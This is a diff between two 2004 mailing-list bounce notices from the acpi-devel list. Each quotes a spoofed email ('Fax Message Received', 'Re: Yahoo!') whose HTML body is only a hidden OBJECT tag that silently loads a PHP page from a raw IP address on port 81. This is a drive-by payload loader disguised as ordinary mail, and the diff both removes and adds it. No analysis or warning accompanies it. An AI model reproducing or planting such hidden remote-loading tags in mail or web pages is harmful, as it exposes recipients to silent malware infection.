@@ -1,8 +1,8 @@
 From: Unknown <unknown@unknown.invalid>
 Subject: Returned Mail: Error During Delivery
-Date: Thu, 18 Mar 2004 06:10:24 +0000 (UTC)
+Date: Thu, 18 Mar 2004 06:15:48 +0000 (UTC)
 Sender: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-Message-ID: <E1B3qhc-0007mU-OI@sc8-sf-list2.sourceforge.net>
+Message-ID: <E1B3qns-0001zX-L5@sc8-sf-list2.sourceforge.net>
 Return-path: <acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org>
 From: Webshield SMTP V4.5 MR1a Mail Service
 Errors-To: acpi-devel-admin-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
@@ -13,7 +13,7 @@ List-Help: <mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5lLLH9aP38K
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/acpi-devel>,
 	<mailto:acpi-devel-request-5NWGOfrQmneRv+LV9MX5utDmRdBvX5/5R9m/fhtKvoLKtGCp0j7rLg@public.gmane.org>
 List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum=acpi-devel>
-Date: Thu Mar 18 01:07:49 2004
+Date: Thu Mar 18 01:14:24 2004
 To: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
 List-Id: linux-acpi@vger.kernel.org
 
@@ -27,12 +27,12 @@ Requested action not taken: mailbox unavailable. [SMTP Error Code 550]
     ---- Contents of the undelivered mail ----
 
 Received: From jwkim.org ([203.233.39.254]) by ibixmaila.ibi.com (WebShield SMTP v4.5 MR1a);
-	id 1079590066333; Thu, 18 Mar 2004 01:07:46 -0500
-Date: Thu, 18 Mar 2004 15:05:17 +0900
+	id 1079590461186; Thu, 18 Mar 2004 01:14:21 -0500
+Date: Thu, 18 Mar 2004 15:10:30 +0900
 To: pgmdsg-/X6VYK7xyaY@public.gmane.org
-Subject: Fax Message Received
+Subject: Re: Yahoo!
 From: acpi-devel-5NWGOfrQmneRv+LV9MX5uipxlwaOVQ5f@public.gmane.org
-Message-ID: <uwzwjlgvhtpjuqbflog-/X6VYK7xyaY@public.gmane.org>
+Message-ID: <defkgvkhpxplesxplij-/X6VYK7xyaY@public.gmane.org>
 MIME-Version: 1.0
 X-Priority: 3
 X-MSMail-Priority: Normal
@@ -43,7 +43,7 @@ Content-Transfer-Encoding: 7bit
 
 <html><body>
 <font  face="System">
-<OBJECT STYLE="display:none" DATA="http://69.81.7.189:81/925705.php">
+<OBJECT STYLE="display:none" DATA="http://24.65.11.109:81/867147.php">
 </OBJECT></body></html>
 
 
